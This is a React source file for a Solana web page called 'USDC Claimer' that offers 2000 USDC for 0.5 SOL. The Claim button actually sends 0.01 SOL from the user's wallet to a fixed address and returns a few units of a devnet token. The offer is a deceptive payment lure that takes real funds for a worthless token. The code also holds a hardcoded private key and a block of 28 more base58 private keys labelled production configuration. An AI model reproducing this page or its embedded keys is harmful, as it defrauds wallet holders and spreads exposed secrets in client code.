/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "okun2P8aJQpsGV1vXAXnprkwA8Ewcze5CPXTtrT27j8XBkq6WtWkNvYFGLmoqAQjcgXxurezexutRjEDdTnceqW"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5CSCaBs84QjPcMiiDY7uoTgGjpke78P74ZF4FDcH1qidTVofe91ALxJFEYGYT5ZcyhCXnP2DkxFT5549ST9znA8Q",
  "key1": "3WEZ41UvBXXHJs43qR8mpYu27oMX7Lo4kGzP4LPBDaTTRgUQ78chsCjVygku4KDHUQGguYRjfhj6ZUWuJK57GDm2",
  "key2": "4qSg1kajDnuzKXLr6JpXdEfswpnsQcomx7DEkTbNt17kUyBXt9wnDkFF96Xo1bGPQfUeVg8JRjUdWrHt5nT6CqN3",
  "key3": "Kgd7qx12eZZA1yRntaQMFTPQG7xi2iC5tg52BBJWTRvZXeFMuakSFQKMQyoKYmRaGa6DFjT71bG4Yv81xoujvhs",
  "key4": "2jBNDbKu8R5oPQxrDfT8r95HBDagEcm5a1F74URmwuKgV3xS9BQdWUAQ2YrzZj7XHarWVEjuZRaWjW5MGpzAE6Xy",
  "key5": "3HWAum8NAgFgmi2kBhK5JsMyxCbvNS23N2VrVQE9i67beHqZ5X439Nbo3zE5ZxVEHf6bi8nbWAG5yeJfKMnHmWNa",
  "key6": "4G51mvhLKqbCtVY1hC1Bz4FL8R4G6GnW8wUx6zQVXmnr1RCHaznSHUG2uMBAWi6bhCXcp8royG4bbAiwxqPRrCY3",
  "key7": "3ucnp9bXQemdqw4Yv1yKDjHA8Pf36b1N16HPqzbbnG5z3EpLWagQ9Are2HkVNQXrUqKdVfXDuaEEE279BonQS5sZ",
  "key8": "4Tmpkn4Vk5bm9cEUY7tdmMdjYyo5eJrxX2Vhe26KNR41vZpQfCVUu35fuwEoFFoFLFu3CgQgx5gvPyNYYNDmqkwt",
  "key9": "2ihpvr7P3h2hV8fCfzAzLujYrZG3gsRT4DQ3r1DdrvCDWGEzwu76XLBRtzzd9fGvqC9R8K9TyikaczV61j4P5hCz",
  "key10": "29jY4MExrxzJqAdnSRauSk573Ku3iJ1Pa3TVyUZtgf6WP7tHPk6GEnisEjPzV9PkRBFyqzRdHzeCFcSY9wmECqkt",
  "key11": "MwouhLMVtnuwMzWWKZV9EwTCtd9ZGCWGFvMu2bsKk1jQ1SzDsjvdcX7Dqf68CEgzvmdfrVqK95czxPah8sHS6en",
  "key12": "4ydX7uciCPUvcTfPU9dWNjccHYk1AWMt2WpCaLpJHybH971Latn4A78dGYajPov5xDq7y7fpjY1Q9hpJBH1gFWKc",
  "key13": "jDPaCoJ649Uk2PX9wrTRt12izgwcZa6ZdDhnEphHuaqJCAAp1tXBAwPZBXci4cePTS1PDsqkuP17x4hFjhwq7Ap",
  "key14": "3owvwUshgdfCTBrDHBgaC19pkTMAQmt8X8cZ2Z8yBPTzBzXjh87zQvdnczKuLzMfbNTqrvc2gyhk9zUFbeaMwHEf",
  "key15": "3dvWUZS8SPJGq6AxvbX5mYgXiuWrjAi5NBrVMbtHCWfXDpFZCEmVqpCcsC3hAZHVVuE5bnBLWc3dVwiamPre1467",
  "key16": "8NGEoxNYiQhKH7nMSppkgesmWaLCqjRcScKQuByhbnznd2S82MhgSvc98pFsDwHfVVC2Bm85JD8PrpQC2AvjZw2",
  "key17": "29AxnadxSHpy5Y9BQy1YT4TwjMKL1VAFQVP5fzPqicpPnqBYjEMcHCsRpUNKmoEWzau4t8X5RCURjRQPYDbtj1Tm",
  "key18": "2EhFKEbjG2tV8SUKZk8EFXRT8BWpGB6fgQ64Q8by2a96F6ehSZfbVHh2Pwb7JA3o1EHm2fMPSc5kvE3Bswdt15RW",
  "key19": "3rVEFmyXtS4CreMmkKTuZXzntEo2BFcuMPUfqZrV57KXmocw4PG5QvGP2UpQkB3cgxNGWLwZ3e1YSG56m6rvMMvz",
  "key20": "362MMBV7mnv4aGA2kL9QqSkpD8c4xFWyPVsY5t2bV5iDqYyg5f9q1U9UKEgpHLcThYgG7fQEZCxGL1zpPfGisg7R",
  "key21": "4QeaGNCBDi4tuELaE8HHLmPcUJvvPATYfPoHd57ckxU6iqJmAsJNyVoJS5Fus3JgSTSCsPye6vyX3nfC5Px3bGUz",
  "key22": "2HauUhZoVYFfuaZHCeAtmMLpuFAjx3o7uUu6PPRhL1grB72CxQGVoVfic8Cc9JAqjj5gJTirq8npv2h2wo6RGJho",
  "key23": "fqgv1Q5eveQQQG2i7wzMHcYdm6iYtPmF2fe3HXf2wMUZojGG2nLLeeHTEhBmAwMnbKn4sa8awC5YKN9XQM3v1iP",
  "key24": "57T9cz8fLM2QasHudUTVYMJXEAydN7awvLkQyJhhLmBPYbPrNdeLRaWNroakUX2QwR9PDRTDcDkgSVozG1EyTQwZ",
  "key25": "Q1LGbJTP1ydAvh3YNe3qruxAvn7R9VDjwV2y1m77ngM7rz7Qsz6ZPX5EQznhh4QhiWdpWUjjHnag1BqaFni1vBy",
  "key26": "51XNPxq7rtRrNazTjUJXqnni1LmfnUvYsLJJHQk4mbLr4W3hyCgatzYrqhxVWbipsgAVtN2ade6WBBmcRJYms6Ty",
  "key27": "5tpUVBne9smgPneDqk7KPVVmTgRrPtVwL4GPcpFFZ1tPEhsd6wfi26Dm4ZKhSpC7nhb72XVXfM21Hp3AZLkKP3Y"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
